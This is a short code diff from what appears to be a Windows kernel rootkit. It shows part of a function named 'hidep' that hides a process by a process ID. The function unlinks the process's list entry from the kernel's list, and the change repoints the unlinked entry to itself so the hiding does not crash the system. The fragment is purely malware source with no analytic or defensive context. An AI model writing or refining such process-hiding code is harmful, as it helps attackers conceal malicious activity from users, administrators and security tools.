@@ -19,8 +19,8 @@ PCHAR hidep(UINT32 pid) {
 		next->Blink = prev;
 
 		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
-		currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
-		currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
+		currentList->Blink = currentList;
+		currentList->Flink = currentList;
 	}
 	
 	return NULL;
